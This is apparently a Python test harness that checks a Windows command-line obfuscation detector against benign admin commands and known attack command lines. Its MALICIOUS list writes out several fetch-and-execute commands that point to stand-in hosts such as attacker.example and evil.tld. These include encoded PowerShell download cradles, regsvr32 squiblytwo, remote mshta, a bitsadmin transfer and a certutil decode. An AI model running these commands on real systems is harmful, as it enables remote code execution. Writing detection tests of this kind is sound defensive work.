"""Validate T1140 analyzer against a realistic cmdline corpus.

Mixes (a) benign admin commands sampled from a real Win10 box
(b) benign but 'base64-looking' strings that shouldn't decode
(c) known-bad attacker cmdlines from public IR reports.

Prints FP (benign that fired) and TP (malicious that fired) so we can
eyeball the false-positive rate of analyze_cmdline_obfuscation.
"""

from __future__ import annotations

import base64
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from sift_find_evil.memory.obfuscation import analyze_cmdline_obfuscation  # noqa: E402


BENIGN = [
    # --- Windows admin / service cmdlines sampled from a clean Win10 box ---
    r"C:\Windows\System32\svchost.exe -k NetworkService -p",
    r"C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s StorSvc",
    r"C:\Windows\System32\services.exe",
    r'"C:\Windows\System32\wbem\WmiPrvSE.exe" -Embedding',
    r"powershell.exe -ExecutionPolicy Bypass -NoProfile -File C:\Scripts\healthcheck.ps1",
    r"powershell.exe -ExecutionPolicy Unrestricted -NonInteractive -NoLogo -Command Get-Service",
    r'powershell.exe -ExecutionPolicy RemoteSigned -Command "Get-ChildItem C:\Logs"',
    # legit certutil — hash verification, not decode
    r"certutil -hashfile C:\Users\dev\installer.msi SHA256",
    r"C:\Windows\System32\certutil.exe -store my",
    # legit bitsadmin status
    r"bitsadmin /list /allusers",
    # legit regsvr32 local DLL registration
    r'regsvr32 /s "C:\Program Files\Vendor\plugin.dll"',
    # legit rundll32 (no javascript: protocol)
    r"rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
    r"rundll32.exe printui.dll,PrintUIEntry /il",
    # mshta launching a local HTA (not remote) — no http/vbscript: literal
    r'mshta.exe "C:\Program Files\Vendor\installer.hta"',
    # legit PowerShell with a base64-ish literal that isn't -Encoded
    r'powershell.exe -Command "$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(\"hello\")); Write-Host $b"',
    # GPO / scheduled-task shell wrappers
    r'C:\Windows\System32\cmd.exe /c "C:\Windows\System32\gpupdate.exe /force"',
    r"schtasks.exe /query /fo LIST",
    # Chocolatey / winget
    r"choco.exe install -y 7zip",
    r"winget.exe install --id Microsoft.VisualStudioCode",
    # Edge/Chrome launch lines (worst offenders for long base64-looking flags)
    r'"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --flag-switches-begin --flag-switches-end',
    r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory=Default --app-id=cnpgpogabkfdcuopbaaejlaidiggnkmd',
    # Office click-to-run
    r'"C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe" /service',
    # Long base64-looking token that isn't a -Encoded argument (should NOT fire)
    r'curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abc" https://example.com/api',
    # Genuine PowerShell -enc used by a vendor (short so no decode)
    r"powershell.exe -noprofile -Command Get-Host",
]


def ps_encode(s: str) -> str:
    return base64.b64encode(s.encode("utf-16-le")).decode("ascii")


MALICIOUS = [
    # Classic download cradle, UTF-16LE base64 via -EncodedCommand
    (
        "ps_enc_downloadstring",
        f"powershell.exe -EncodedCommand {ps_encode('IEX (New-Object Net.WebClient).DownloadString(\"http://attacker.example/a.ps1\")')}",
    ),
    # Short -enc alias
    (
        "ps_enc_short_alias",
        f"pwsh -enc {ps_encode('Invoke-WebRequest http://evil.tld/x -OutFile $env:TEMP\\x.exe; Start-Process $env:TEMP\\x.exe')}",
    ),
    # squiblydoo
    (
        "rundll32_squiblydoo",
        r'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("calc.exe")',
    ),
    # squiblytwo
    (
        "regsvr32_squiblytwo",
        r"regsvr32.exe /s /n /u /i:http://attacker.example/file.sct scrobj.dll",
    ),
    # mshta remote
    ("mshta_http", r"mshta.exe http://attacker.example/payload.hta"),
    (
        "mshta_vbscript",
        r'mshta.exe vbscript:CreateObject("Wscript.Shell").Run("calc.exe")(window.close)',
    ),
    # certutil decode
    (
        "certutil_decode",
        r"certutil -decode C:\Users\Public\payload.b64 C:\Users\Public\payload.exe",
    ),
    # bitsadmin transfer
    (
        "bitsadmin_transfer",
        r"bitsadmin /transfer download /priority high http://attacker.example/x.exe C:\Users\Public\x.exe",
    ),
    # Plaintext IEX + WebClient
    (
        "iex_webclient",
        r'powershell -NoP -W Hidden "IEX (New-Object Net.WebClient).DownloadString(\"http://attacker.example/p.ps1\")"',
    ),
    # PS -enc wrapping Reflection.Assembly (in-memory PE load, no URL literal)
    (
        "ps_enc_reflection",
        f"powershell -EncodedCommand {ps_encode('[Reflection.Assembly]::Load([Convert]::FromBase64String($payload)).EntryPoint.Invoke($null,$null)')}",
    ),
]


def main() -> int:
    results = {
        "benign_total": len(BENIGN),
        "malicious_total": len(MALICIOUS),
        "false_positives": [],
        "true_positives": [],
        "false_negatives": [],
    }
    for cmd in BENIGN:
        r = analyze_cmdline_obfuscation(cmd)
        if r is not None:
            results["false_positives"].append(
                {
                    "cmd": cmd[:120] + ("..." if len(cmd) > 120 else ""),
                    "reasons": list(r.reasons),
                    "high_severity": r.high_severity,
                }
            )
    for name, cmd in MALICIOUS:
        r = analyze_cmdline_obfuscation(cmd)
        if r is None:
            results["false_negatives"].append({"name": name, "cmd": cmd[:120]})
        else:
            results["true_positives"].append(
                {
                    "name": name,
                    "high_severity": r.high_severity,
                    "reasons": list(r.reasons),
                    "mitre": list(r.mitre_attack),
                }
            )
    fp = len(results["false_positives"])
    tp = len(results["true_positives"])
    fn = len(results["false_negatives"])
    print(json.dumps(results, indent=2))
    print(
        f"\nSummary: TP={tp}/{len(MALICIOUS)}, FP={fp}/{len(BENIGN)}, FN={fn}",
        file=sys.stderr,
    )
    return 0 if (fp == 0 and fn == 0) else 1


if __name__ == "__main__":
    sys.exit(main())
